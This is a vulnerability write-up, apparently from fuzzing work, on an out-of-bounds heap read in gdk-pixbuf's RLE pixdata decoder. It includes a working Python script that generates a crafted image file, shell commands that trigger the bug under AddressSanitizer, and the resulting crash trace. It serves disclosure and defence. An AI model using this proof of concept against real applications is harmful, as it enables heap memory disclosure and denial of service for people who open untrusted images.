## Bug0: Out-of-Bounds Heap Read in RLE Decoder Due to Missing rle_buffer Bounds Check

The RLE decode loop in `gdk_pixbuf_from_pixdata()` (`gdk-pixdata.c`, lines 452–503) advances `rle_buffer` without ever verifying it remains within the `pixel_data` allocation, so a crafted GdkPixdata file with truncated RLE payload causes the decoder to read heap memory past the end of the input buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

MAGIC = 0x47646b50
# pixdata_type: COLORSPACE_RGB(0x02) | SAMPLE_WIDTH_8(0x010000) | ENCODING_RLE(0x02000000)
PIXDATA_TYPE_RGBA_RLE = 0x02010002

width = 100
height = 100
bpp = 4
rowstride = width * bpp  # 400
# Total output needed: 100 * 400 = 40000 bytes

# pixel_data: only one constant RLE run, covers 127 pixels = 508 bytes
# Leaves 39492 bytes of output unfilled -> rle_buffer reads OOB after 5 bytes consumed
pixel_data = bytes([
    0xFF,                      # constant run header: length = 0xFF - 128 = 127
    0xFF, 0xFF, 0xFF, 0xFF,    # RGBA pixel value (opaque white)
])

total_length = 24 + len(pixel_data)  # 29

header = struct.pack(">IIIIII",
    MAGIC,
    total_length,
    PIXDATA_TYPE_RGBA_RLE,
    rowstride,
    width,
    height,
)

data = header + pixel_data
outpath = "poc_input.gdkp"
with open(outpath, "wb") as f:
    f.write(data)
print(f"Generated {outpath} ({len(data)} bytes)")
print(f"  Header: magic=0x{MAGIC:08X}, length={total_length}, type=0x{PIXDATA_TYPE_RGBA_RLE:08X}")
print(f"  Image: {width}x{height} RGBA, rowstride={rowstride}")
print(f"  pixel_data: {len(pixel_data)} bytes (covers only 127 of {width*height} pixels)")
print(f"  Expected: rle_buffer OOB read after pixel_data[4] exhausted")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: unknown-crash on address 0x50c00000083e at pc 0x7f0b8466ef9d bp 0x7ffc285af8c0 sp 0x7ffc285af8b0
READ of size 4 at 0x50c00000083e thread T0
    #0 0x7f0b8466ef9c in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xacf9c)
    #1 0x7f0b846894fb in try_load (libgdk_pixbuf-2.0.so.0+0xc74fb)
0x50c000000840 is located 0 bytes to the right of 128-byte region [0x50c0000007c0, 0x50c000000840)

### Impact

An attacker who supplies a crafted GdkPixdata file can cause `gdk_pixbuf_from_pixdata()` to read up to thousands of bytes of heap memory adjacent to the pixel data allocation, enabling information disclosure of heap contents that may include pointers, keys, or other sensitive data. Any application that loads untrusted images via gdk-pixbuf is exposed through the standard `gdk_pixbuf_new_from_file()` code path with no user interaction beyond opening the file. On hardened targets the out-of-bounds read falls into an ASAN redzone immediately past the allocation boundary, causing an immediate crash and denial of service.
